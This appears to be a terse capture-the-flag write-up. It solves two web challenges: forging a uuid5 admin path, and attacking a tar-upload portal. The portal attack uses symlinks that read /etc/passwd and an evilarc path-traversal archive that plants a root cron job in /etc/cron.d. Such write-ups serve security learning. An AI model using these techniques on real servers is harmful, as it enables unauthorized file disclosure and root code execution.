Server says
-----------
if username == 'admin123':
            return 'Stop trying to act like you are the admin!'
        uid = uuid.uuid5(leet,username) # super secure!
        return redirect(f'/{uid}')

So, I generate uuid
-------------------

>>> import uuid
>>> leet=uuid.UUID('13371337-1337-1337-1337-133713371337')
>>> print(uuid.uuid5(leet,'admin123'))
3c68e6cc-15a7-59d4-823c-e7563bbb326c


Finally > http://24.199.110.35:40150/3c68e6cc-15a7-59d4-823c-e7563bbb326c ( because of return redirect(f'/{uid}') )

We got a flag.

Server says
------------

environment:
      - FLAG="n00bz{f4k3_fl4g_f0r_t3st1ng}"


It shows the user environment variable
--------------------------------------
/proc/self/environ is the same with the command #printenv


file sharing portal (Symlink injection)
--------------------

Symlink injection > creates a random file > After that the file you wants to read in target or server and then linked with a random file.


/etc/passwd (the file you wants to read)

exploit ( a random file you created )

#ln -s /etc/passwd exploit


The server only accepts the tar file, so that zip with tar
----------------------------------------------------------

#tar -cvf exploit.tar exploit.

crontab is running in the server


echo "*/5 * * * * root rm -rf /app/uploads/*" > /etc/cron.custom/cleanup-cron


In docker file
--------------

COPY REDACTED.txt /app/ ( we don't know about the flag > it named with only REDACTED.txt )

What I need to create a crontab to cat all the files under /app
-----------------------------------------------------------------

inject (file name)

* * * * * root cat /app/* > /tmp/file

****Important thing is I have to change the owner to root > because the server cats the file with the root owner*****

#sudo chown root:root inject 

What I want to do is write a file in the server
------------------------------------------------

1. I have to install the python file ( https://github.com/ptoomey3/evilarc/blob/master/evilarc.py ) > exploit.py
2. chmod +x exploit.py
3. python2 exploit.py inject -o linux -f inject.tar -p /etc/cron.d 
4. Upload inject.tar in the file > It will show anything > but we know I have already written.


5. Read the file /tmp/file

#ln -s /tmp/file read
#tar -cvf file.tar read


6. Upload file.tar > After one minute > We will see the files under /app directory.

